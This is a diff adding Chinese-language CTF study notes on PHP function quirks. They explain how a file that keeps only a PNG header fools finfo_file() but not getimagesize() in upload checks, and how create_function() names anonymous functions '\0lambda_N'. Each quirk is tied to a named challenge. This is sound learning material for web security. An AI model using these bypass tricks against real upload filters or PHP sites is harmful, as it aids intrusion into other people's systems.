+### 5.1 `finfo_file()` 和 `getimagesize()` 的特征
+
+1. 例题：[HarekazeCTF2019] Avatar Uploader 1
+
+2. 参考链接：
+
+    > https://blog.csdn.net/weixin_44037296/article/details/112604812
+    > https://www.cnblogs.com/zhoulujun/p/15113029.html
+
+3. 这两个函数应该都可以用于获取文件的类型。在官方页面，对于 `finfo_file()` 下方，有人提出该函数可能有安全问题：
+    ![image-20240911092303199](PHP/image-20240911092303199.png)
+
+4. 函数`finfo_file()`其主要是识别 **PNG** 文件十六进制下的第一行信息（保留其 `IHDR` 文件头数据块），若保留文件头信息，破坏掉文件长宽等其余信息，也就可以绕过`getimagesize()` 函数的检验。也就是说，只要前十六进制是 PNG 的格式，那么 `finfo_file()` 就会返回 PNG 结果，但是 `getimagesize()` 返回的数组中的内容不会表明其为 PNG。
+    ![image-20240911092627048](PHP/image-20240911092627048.png)
+
+5. TODO：PHP 源码分析，这里 `finfo_file()` 函数的特性必定要分析 PHP 的核心源码。
+    先贴个教程：
+
+    > https://blog.csdn.net/weixin_33819479/article/details/89275055
+
+### 5.2 `create_fuction()` 返回匿名函数的命令格式
+
+1. 官方的使用方法：
+
+    > https://www.php.net/manual/zh/function.create-function.php
+    > Returns a unique function name as a string, 或者在失败时返回 **`false`**. Note that the name contains a non-printable character **(`"\0"`)**, so care should be taken when printing the name or incorporating it in any other string.
+
+2. 返回值用变量接住，这个变量就当函数名了，但是它还有另外一个名称：
+    `\0lambda_数字`。
+
+3. 数字部分从 `1` 开始，每有一个匿名函数，后面的数字 `++`：
+    ![image-20240917230816889](PHP/image-20240917230816889.png)
+
+4. 例题：[SUCTF 2018]annonymous
